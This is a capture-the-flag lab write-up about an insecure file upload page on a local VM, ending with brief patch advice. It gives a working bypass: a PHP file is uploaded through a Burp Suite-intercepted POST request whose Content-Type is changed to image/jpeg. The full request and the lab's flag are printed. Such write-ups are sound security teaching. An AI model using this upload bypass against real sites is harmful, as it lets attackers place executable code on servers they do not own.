# B09-UploadInsecure-Upload

## BREACH

PATH `http://192.168.56.110/?page=upload`

For this breach, we have an input where we can upload files.

Upload file can be exploit by hacker because if some check are not done properly user can upload some code that can be executed.

Here we can, Send a `php` file with `Burpsuite`, intercept our `POST` to update the Content-type to `image/jpeg`

```
┌─[✗]─[user@parrot]─[~]
└──╼ $touch random.php
┌─[✗]─[user@parrot]─[~]
└──╼ $echo '<?php phpinfo(); ?>' > random.php
```

Now we can send it and intercept the request with `Burpsuite`

```
POST /?page=upload HTTP/1.1
Host: 192.168.56.110
Content-Length: 420
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.56.110
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeKgO7ExyLYAXBwy9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.110/?page=upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: close

------WebKitFormBoundaryeKgO7ExyLYAXBwy9
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryeKgO7ExyLYAXBwy9
Content-Disposition: form-data; name="uploaded"; filename="random.php"
Content-Type: application/x-php

<?php phpinfo(); ?>

------WebKitFormBoundaryeKgO7ExyLYAXBwy9
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryeKgO7ExyLYAXBwy9--
```

We change the `Content-Type`

```
Content-Type: image/jpeg
```

We get the flag

```
THE FLAG IS : 46910D9CE35B385885A9F7E2B336249D622F29B267A1771FBACF52133BEDDBA8
```

## PATCH

To patch this you need to absolutely prevent user to pass something unexpected. So need to allowed just useful file not everything, and with that never accept a filename without accept filter. 

Beside this, the content of the file need to be checked. 

All special caractere need to be filtered

You can also limit the upload size